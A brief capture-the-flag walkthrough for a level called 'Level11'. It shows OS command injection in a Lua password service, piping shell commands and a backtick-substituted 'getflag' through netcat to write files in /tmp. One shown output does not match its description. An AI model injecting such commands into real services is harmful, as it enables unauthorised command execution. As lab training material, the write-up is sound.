# Level11

**Exploit:** OS command injection in Lua

The server includes the supplied password in a shell command, so shell syntax in the password can run another command.

## Walkthrough

The Lua service listens on port `5151`. Connect and try an ordinary password:

```text
nc localhost 5151
Password: test
Erf nope..
```

Try a command that writes a file:

```text
nc localhost 5151
Password: echo 'bonjour' > /tmp/test4
Erf nope..
```

Confirm that the command created the file:

```bash
cat /tmp/test4
```

Output:

```text
echo bonjour
```

The file contains the command's output, confirming that the password is executed by a shell. Use command substitution to run `getflag` and save its output:

```text
nc localhost 5151
Password: `getflag` > /tmp/test7
Erf nope..
```

Read the result:

```bash
cat /tmp/test7
```

Output:

```text
we get the token
```
